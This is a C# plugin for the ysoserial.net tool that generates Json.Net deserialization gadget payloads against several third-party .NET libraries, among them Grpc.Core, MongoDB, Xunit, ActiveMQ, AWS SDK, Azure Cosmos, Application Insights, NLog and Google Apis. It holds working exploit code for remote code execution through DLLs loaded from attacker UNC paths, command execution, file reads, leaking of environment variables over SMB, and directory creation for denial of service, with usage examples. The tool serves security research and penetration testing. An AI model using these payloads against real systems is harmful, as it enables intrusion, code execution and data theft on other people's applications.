using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using NDesk.Options;
using ysoserial.Generators;
using ysoserial.Helpers;

namespace ysoserial.Plugins
{
    // Author: Piotr Bazydlo
    // Implements gadgets for 3rd party libraries.
    // Gadgets are implemented for several serializers but some of serializers are not implemented (like MessagePack)
    // Feel free to add any gadget here or contribute with the implementations for different serializers

    public class ThirdPartyGadgetsPlugin : IPlugin
    {
        private static string input = "";
        private static string gadget = "";
        private static string formatter = "";
        private static bool showList;
        private static bool removeVersion;
        private static bool test;
        private static bool minify;

        private static readonly OptionSet options = new OptionSet
        {
            {
                "l", "prints list of implemented gadgets", v =>
                {
                    if (v != null) showList = true;
                }
            },
            {"i|input=", "input to the gadget", v => input = v},
            {"g|gadget=", "gadget to use", v => gadget = v},
            {"f|formatter=", "formatter to use", v => formatter = v},
            {"r", "removes version and pubkeytoken from types, it may be useful when we do not know version of targetd library or require short payload", v =>
                {
                    if (v != null) removeVersion = true;
                }
            },
            {
                "t", "test gadget (execute after generation)", v =>
                {
                    if (v != null) test = true;
                }
            },
            {
                "minify", "minify gadget", v =>
                {
                    if (v != null) minify = true;
                }
            }
        };

        public string Name()
        {
            return "ThirdPartyGadgets";
        }

        public string Description()
        {
            return "Implements gadgets for 3rd Party Libraries";
        }
        public string Credit()
        {
            return "Piotr Bazydlo";
        }
        public OptionSet Options()
        {
            return options;
        }

        public string GadgetsList()
        {
            return @"
Gadgets:

    (*) UnmanagedLibrary (Grpc.Core) - RCE with remote DLL loading (native C/C++ DLL can be loaded)
        Affects: .NET Framework and .NET 5/6/7
        Input: path to the DLL (UNC path for remote loading or local path)
        Formatters: Json.Net
        Tested Version: 2.46.6
        [Finders: Piotr Bazydlo]

    (*) WindowsLibrary (MongoDB Libmongocrypt) - RCE with remote DLL loading (native C/C++ DLL can be loaded)
        Affects: .NET Framework and .NET 5/6/7, alternatives exist for Linux (LinuxLibrary) and Mac (DarwinLibrary)
        Input: path to the DLL (UNC path for remote loading or local path)
        Formatters: Json.Net
        Tested Version: 1.8.0
        [Finders: Piotr Bazydlo]

    (*) Xunit1Executor (Xunit Runner Utility) - RCE with remote DLL loading (C# or mixed DLL can be loaded)
        Affects: .NET Framework
        Input: path to the xunit.dll (like \\192.168.1.100\poc\xunit.dll), which implements Xunit.Sdk.Executor class with the Executor(String) constructor. This constructor will be called upon DLL load. Mixed DLLs should work too.
        Formatters: Json.Net
        Tested Version: 2.5.1
        [Finders: Piotr Bazydlo]

    (*) GetterActiveMQObjectMessage (Apache NMS ActiveMQ) - RCE by chaining Arbitrary Getter Call gadget and ActiveMQObjectMessage serialization gadget
        Affects: .NET Framework
        Input: command to execute
        Formatters: Json.Net
        Tested Version: 2.1.0
        [Finders: Piotr Bazydlo]

    (*) PreserverWorkingFolder (Xunit + Xunit Runner Utility) - sets current directory through Directory.SetCurrentDirectory. Can be used to mess with file operations based on relative paths
        Affects: .NET Framework
        Input: path to the directory that we want to set, can be either remote (UNC) or local path
        Formatters: Json.Net
        Tested Version: 2.5.1
        [Finders: Piotr Bazydlo]

    (*) OptimisticLockedTextFile (Amazon AWSSDK.Core) - file read during deserialization. File content is returned if the object is serialized again and returned to the attacker.
        Affects: .NET Framework
        Input: path to the file
        Formatters: Json.Net
        Tested Version: 3.7.202.19
        [Finders: Piotr Bazydlo]

    (*) QueryPartitionProvider (Microsoft Azure Cosmos) - triggers Json.NET serialization on the attacker-provided object. Can be chained with serialization gadgets.
        Affects: .NET Framework
        Input: path to the file that stores the serialization gadget. This serialized payload will be deserialized by a given serializer and then serialized with Json.NET.
        Formatters: Json.Net
        Tested Version: 3.35.4
        [Finders: Piotr Bazydlo]

    (*) FileDiagnosticsTelemetryModule (Microsoft Application Insights) - leaks environment variable through SMB connection or creates new directory (potential DoS)
        Affects: .NET Framework
        Input: Env variable leak: UNC path to attacker's server, with the environment variable specified, like: \\192.168.1.100\%USERNAME%; Directory Creation: path
        Formatters: Json.Net
        Tested Version: 2.21.0
        [Finders: Piotr Bazydlo]

    (*) SingleProcessFileAppender (NLog) - Directory/empty file creation gadget. Can potentially lead to DoS. There are 2 variants: CountingSingleProcessFileAppender and MutexMultiProcessFileAppender
        Affects: .NET Framework
        Input: Path to the directory/file
        Formatters: Json.Net
        Tested Version: 5.2.4
        [Finders: Piotr Bazydlo]

    (*) FileDataStore (Google Apis) - Directory creation gadget. Can potentially lead to DoS
        Affects: .NET Framework
        Input: Path to the directory/file
        Formatters: Json.Net
        Tested Version: 1.62.1
        [Finders: Piotr Bazydlo]

Exemplary usage: 

    ysoserial.exe -p ThirdPartyGadgets -l

    ysoserial.exe -p ThirdPartyGadgets -f Json.Net -g UnmanagedLibrary -i \\\\192.168.1.100\\poc\\cppDll.dll -r

    ysoserial.exe -p ThirdPartyGadgets -f Json.Net -g GetterActiveMQObjectMessage -i ""cmd.exe /c calc.exe""

    ysoserial.exe -p ThirdPartyGadgets -f Json.Net -g QueryPartitionProvider -i ""C:\Users\Public\inner.json""

    ysoserial.exe -p ThirdPartyGadgets -f Json.Net -g FileDiagnosticsTelemetryModule -i ""\\\\192.168.1.100\\%USERNAME%""

";
        }

        //UnmanagedLibrary gadget
        public string UnmanagedLibrary(string input, string formatter)
        {

            String gadget = "";
            
            if (formatter.ToLower() == "json.net")
            {
                gadget = @"
{
    '$type':'Grpc.Core.Internal.UnmanagedLibrary, Grpc.Core, Version=2.0.0.0, Culture=neutral, PublicKeyToken=d754f35622e28bad',
    'libraryPathAlternatives':
    [
        '" + input + @"'
    ]
}";
            }
            else
            {
                Console.WriteLine("Formatter " + formatter + " is not implemented for the PictureBox gadget");
                Environment.Exit(-1);
            }

            return gadget;
        }

        //WindowsLibrary gadget
        public string WindowsLibrary(string input, string formatter)
        {

            String gadget = "";

            if (formatter.ToLower() == "json.net")
            {
                gadget = @"
{
    '$type':'MongoDB.Libmongocrypt.LibraryLoader+WindowsLibrary, MongoDB.Libmongocrypt, Version=1.8.0.0, Culture=neutral, PublicKeyToken=null',
    'path':'" + input + @"'
}";
            }
            else
            {
                Console.WriteLine("Formatter " + formatter + " is not implemented for the PictureBox gadget");
                Environment.Exit(-1);
            }

            return gadget;
        }

        //Xunit1Executor gadget
        public string Xunit1Executor(string input, string formatter)
        {

            String gadget = "";

            if (formatter.ToLower() == "json.net")
            {
                gadget = @"
{
    '$type':'Xunit.Xunit1Executor, xunit.runner.utility.net452, Version=2.5.1.0, Culture=neutral, PublicKeyToken=8d05b1bb7a6fdb6c',
    'useAppDomain':true,
    'testAssemblyFileName':'" + input + @"'
}
";
            }
            else
            {
                Console.WriteLine("Formatter " + formatter + " is not implemented for the PictureBox gadget");
                Environment.Exit(-1);
            }

            return gadget;
        }

        //GetterActiveMQObjectMessage gadget
        public string GetterActiveMQObjectMessage(string input, string formatter)
        {

            String gadget = "";


            InputArgs inputArgs = new InputArgs();
            inputArgs.Cmd = input;

            IGenerator generator = new TypeConfuseDelegateGenerator();
            byte[] binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);


            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);

            if (formatter.ToLower() == "json.net")
            {


                String payloadActive = @"
            {
                '$type':'Apache.NMS.ActiveMQ.Commands.ActiveMQObjectMessage, Apache.NMS.ActiveMQ, Version=2.1.0.0, Culture=neutral, PublicKeyToken=82756feee3957618',
                'Content':'" + b64encoded + @"',
                'Connection':
                {
                    'connectionUri':'http://localhost',
                    'transport':
                    {
                        '$type':'Apache.NMS.ActiveMQ.Transport.Failover.FailoverTransport, Apache.NMS.ActiveMQ, Version=2.1.0.0, Culture=neutral, PublicKeyToken=82756feee3957618'
                    },
                    'clientIdGenerator':
                    {
                        '$type':'Apache.NMS.ActiveMQ.Util.IdGenerator, Apache.NMS.ActiveMQ, Version=2.1.0.0, Culture=neutral, PublicKeyToken=82756feee3957618'
                    }
                }
            }";

                gadget = @"
    {
        ""$type"":""System.Windows.Forms.PropertyGrid, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"",
        ""SelectedObjects"":
        [
    " + payloadActive + @"
        ]
    }";
            }
            else
            {
                Console.WriteLine("Formatter " + formatter + " is not implemented for the PictureBox gadget");
                Environment.Exit(-1);
            }

            return gadget;
        }

        //PreserveWorkingFolder gadget
        public string PreserveWorkingFolder(string input, string formatter)
        {

            String gadget = "";

            //we need to add any filename
            if (input[input.Length - 1].Equals('\\') || input[input.Length - 1].Equals('/'))
            {
                input += "test.txt";
            }
            else
            {
                input += "\\\\test.txt";
            }

            if (formatter.ToLower() == "json.net")
            {
                gadget = @"
{
    '$type':'Xunit.Sdk.TestFrameworkDiscoverer+PreserveWorkingFolder, xunit.execution.desktop, Version=2.5.1.0, Culture=neutral, PublicKeyToken=8d05b1bb7a6fdb6c',
    'assemblyInfo':
    {
        '$type':'Xunit.Xunit1AssemblyInfo, xunit.runner.utility.net452, Version=2.5.1.0, Culture=neutral, PublicKeyToken=8d05b1bb7a6fdb6c',
        'assemblyFileName':'" + input + @"'
    }
}";
            }
            else
            {
                Console.WriteLine("Formatter " + formatter + " is not implemented for the PictureBox gadget");
                Environment.Exit(-1);
            }

            return gadget;
        }

        //OptimisticLockedTextFile gadget
        public string OptimisticLockedTextFile(string input, string formatter)
        {

            String gadget = "";

            if (formatter.ToLower() == "json.net")
            {
                gadget = @"
{
    '$type':'Amazon.Runtime.Internal.Util.OptimisticLockedTextFile, AWSSDK.Core, Version=3.3.0.0, Culture=neutral, PublicKeyToken=885c28607f98e604',
    'filePath':'" + input + @"'
}";
            }
            else
            {
                Console.WriteLine("Formatter " + formatter + " is not implemented for the PictureBox gadget");
                Environment.Exit(-1);
            }

            return gadget;
        }

        //QueryPartitionProvider gadget
        public string QueryPartitionProvider(string input, string formatter)
        {

            if (!File.Exists(input))
            {
                Console.WriteLine("Provided file " + input + " does not exist");
                Environment.Exit(-1);
            }
            
            String gadget = "";


            if (formatter.ToLower() == "json.net")
            {
                gadget = @"
{
    '$type':'Microsoft.Azure.Cosmos.Query.Core.QueryPlan.QueryPartitionProvider, Microsoft.Azure.Cosmos.Client, Version=3.35.4.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'queryengineConfiguration':
    {
        'poc':
" + File.ReadAllText(input) + @"
    }
}
";
            }
            else
            {
                Console.WriteLine("Formatter " + formatter + " is not implemented for the PictureBox gadget");
                Environment.Exit(-1);
            }

            return gadget;
        }

        //FileDiagnosticsTelemetryModule gadget
        public string FileDiagnosticsTelemetryModule(string input, string formatter)
        {

            String gadget = "";

            if (formatter.ToLower() == "json.net")
            {
                gadget = @"
{
    '$type':'Microsoft.ApplicationInsights.Extensibility.Implementation.Tracing.FileDiagnosticsTelemetryModule, Microsoft.ApplicationInsights, Version=2.21.0.429, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'LogFilePath':'" + input + @"',
    'LogFileName':'C:\\\\whatever'
}
";
            }
            else
            {
                Console.WriteLine("Formatter " + formatter + " is not implemented for the PictureBox gadget");
                Environment.Exit(-1);
            }

            return gadget;
        }

        //SingleProcessFileAppender gadget
        public string SingleProcessFileAppender(string input, string formatter)
        {

            String gadget = "";

            if (formatter.ToLower() == "json.net")
            {
                gadget = @"
{
    '$type':'NLog.Internal.FileAppenders.SingleProcessFileAppender, NLog, Version=5.0.0.0, Culture=neutral, PublicKeyToken=5120e14c03d0593c',
    'fileName':'" + input + @"',
    'parameters':
    {
        '$type':'NLog.Targets.FileTarget, NLog, Version=5.0.0.0, Culture=neutral, PublicKeyToken=5120e14c03d0593c'
    }
}
";
            }
            else
            {
                Console.WriteLine("Formatter " + formatter + " is not implemented for the PictureBox gadget");
                Environment.Exit(-1);
            }

            return gadget;
        }

        //FileDataStore gadget
        public string FileDataStore(string input, string formatter)
        {

            String gadget = "";

            if (formatter.ToLower() == "json.net")
            {
                gadget = @"
{
    '$type':'Google.Apis.Util.Store.FileDataStore, Google.Apis, Version=1.62.1.0, Culture=neutral, PublicKeyToken=4b01fa6e34db77ab', 
    'folder':'" + input + @"',
    'fullPath':'true'
}
";
            }
            else
            {
                Console.WriteLine("Formatter " + formatter + " is not implemented for the PictureBox gadget");
                Environment.Exit(-1);
            }

            return gadget;
        }

        public string RemoveVersion(string payload)
        {
            //something more accurate should be developed in the future, it's a quick regex-based thing that works for current gadgets

            payload = Regex.Replace(payload, "Version=[0-9][0-9.]*,?\\s?","");
            payload = Regex.Replace(payload, "Culture=neutral,?\\s?", "");
            payload = Regex.Replace(payload, "PublicKeyToken=[a-fA-F0-9]{16},?\\s?", "");
            payload = Regex.Replace(payload, ",\\s'", "'");
            return payload;
        }

        public object Run(string[] args)
        {

            List<string> extra = options.Parse(args);

            //Print list of gadgets
            if (showList)
            {
                return GadgetsList();
            }

            //inputs verification
            try
            {
                if (string.IsNullOrWhiteSpace(gadget)) throw new ArgumentException("A gadget name must be provided.");

                if (string.IsNullOrWhiteSpace(formatter)) throw new ArgumentException("A formatter name must be provided.");

                if (string.IsNullOrWhiteSpace(input)) throw new ArgumentException("An input to the gadget must be provided.");
            }
            catch (Exception e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                Console.WriteLine("Try 'ysoserial -p " + Name() + " -l' for the list of implemented gadgets and formatters.");
                Environment.Exit(-1);
            }


            //gadgets generation
            String payload = "";

            if (gadget.ToLower() == "unmanagedlibrary")
            {
                payload = UnmanagedLibrary(input, formatter);
            }
            else if (gadget.ToLower() == "windowslibrary")
            {
                payload = WindowsLibrary(input, formatter);
            }
            else if (gadget.ToLower() == "xunit1executor")
            {
                payload = Xunit1Executor(input, formatter);
            }
            else if (gadget.ToLower() == "getteractivemqobjectmessage")
            {
                payload = GetterActiveMQObjectMessage(input, formatter);
            }
            else if (gadget.ToLower() == "preserveworkingfolder")
            {
                payload = PreserveWorkingFolder(input, formatter);
            }
            else if (gadget.ToLower() == "optimisticlockedtextfile")
            {
                payload = OptimisticLockedTextFile(input, formatter);
            }
            else if (gadget.ToLower() == "querypartitionprovider")
            {
                payload = QueryPartitionProvider(input, formatter);
            }
            else if (gadget.ToLower() == "filediagnosticstelemetrymodule")
            {
                payload = FileDiagnosticsTelemetryModule(input, formatter);
            }
            else if (gadget.ToLower() == "singleprocessfileappender")
            {
                payload = SingleProcessFileAppender(input, formatter);
            }
            else if (gadget.ToLower() == "filedatastore")
            {
                payload = FileDataStore(input, formatter);
            }
            else
            {
                Console.WriteLine("Gadget " + gadget + " does not exist! Use -l option to show available gadgets");
                Environment.Exit(-1);
            }

            //remove version/public key token
            if (removeVersion)
            {
                payload = RemoveVersion(payload);
            }

            //minify
            if (minify)
            {
                if (formatter.ToLower() == "json.net" || formatter.ToLower() == "javascriptserializer")
                {
                    payload = JsonHelper.Minify(payload, null, null);
                }
            }

            //tests
            if (test)
            {
                if (formatter.ToLower() == "json.net")
                {
                    try
                    {
                        Object obj = SerializersHelper.JsonNet_deserialize(payload);
                        if (gadget.ToLower() == "optimisticlockedtextfile")
                        {
                            Console.WriteLine("Testing OptimisticLockedTextFile gadget through deserialization + serialization. Obtained response:");
                            Console.WriteLine(SerializersHelper.JsonNet_serialize(obj));
                        }
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(new InputArgs(), err);
                    }
                }
                else if (formatter.ToLower() == "javascriptserializer")
                {
                    try
                    {
                        SerializersHelper.JavaScriptSerializer_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(new InputArgs(), err);
                    }
                }
                else if (formatter.ToLower() == "xaml")
                {
                    try
                    {
                        SerializersHelper.Xaml_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(new InputArgs(), err);
                    }
                }
            }

            return payload;
        }
    }
}